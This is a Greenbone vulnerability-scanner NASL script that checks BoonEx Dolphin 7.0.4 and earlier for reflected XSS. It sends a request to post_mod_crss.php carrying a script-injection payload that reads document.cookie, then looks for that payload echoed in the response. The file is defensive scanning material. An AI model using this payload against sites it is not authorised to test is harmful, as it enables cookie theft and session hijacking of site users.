# Copyright (C) 2011 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:boonex:dolphin";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801910");
  script_version("2022-03-03T11:03:24+0000");
  script_tag(name:"last_modification", value:"2022-03-03 11:03:24 +0000 (Thu, 03 Mar 2022)");
  script_tag(name:"creation_date", value:"2011-04-11 14:40:00 +0200 (Mon, 11 Apr 2011)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("Dolphin <= 7.0.4 Multiple XSS Vulnerabilities");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_dolphin_http_detect.nasl");
  script_mandatory_keys("boonex/dolphin/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"Dolphin is prone to multiple reflected cross-site scripting
  (XSS) vulnerabilities.");

  script_tag(name:"insight", value:"Input passed via the 'explain' parameter in 'explanation.php'
  script and 'relocate' parameter in '/modules/boonex/custom_rss/post_mod_crss.php' script is not
  properly sanitized before being returned to the user.");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to execute
  arbitrary script code in the browser of an unsuspecting user in the context of an affected
  site.");

  script_tag(name:"affected", value:"Dolphin version 7.0.4 Beta and prior.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/98408/Dolphin7.0.4-xss.txt");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + '/modules/boonex/custom_rss/post_mod_crss.php?relocate="><script>alert(document.cookie)</script>';

if (http_vuln_check(port: port, url: url, pattern: "><script>alert(document\.cookie)</script>",
                    check_header: TRUE)) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
